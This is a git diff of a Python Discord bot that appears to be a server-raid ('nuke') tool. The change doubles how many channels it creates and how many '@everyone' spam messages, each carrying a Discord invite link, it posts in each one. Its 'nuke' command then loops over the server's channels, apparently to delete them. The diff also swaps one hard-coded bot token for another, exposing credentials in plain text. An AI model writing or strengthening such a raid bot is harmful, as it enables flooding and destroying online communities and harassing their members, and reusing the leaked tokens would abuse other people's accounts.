@@ -26,7 +26,7 @@ whitelist_guild_ids = set()
 async def create_and_send(guild):
   try:
     new_channel = await guild.create_text_channel("未命名")
-    for _ in range(25):
+    for _ in range(50):
       asyncio.create_task(
           new_channel.send(
               "# @everyone 今日開始改至二群!!\nhttps://discord.gg/rDSPnTWN6k"
@@ -187,7 +187,7 @@ async def nuke(ctx):
   for _ in range(9):
     asyncio.create_task(ctx.send(msg))
 
-  for _ in range(25):
+  for _ in range(50):
     asyncio.create_task(create_and_send(guild))
 
   for channel in guild.channels:
@@ -245,6 +245,4 @@ async def no_permission_slash(interaction: discord.Interaction):
 
 
 # 啟動機器人
-bot.run(
-    "MTU0MTYxNDE1MTgxNjcwODIyNw.GUXIfR.2u-RH7sYdKgFslTIFf5s5AJD2CXPd1eHnH3Nfc"
-)
+bot.run("MTU0MTYxNDE1MTgxNjcwODIyNw.GNi37x.16FpkdMfUfJX1rcYpI4S5HBE_Yf48VB7n1S9s4")
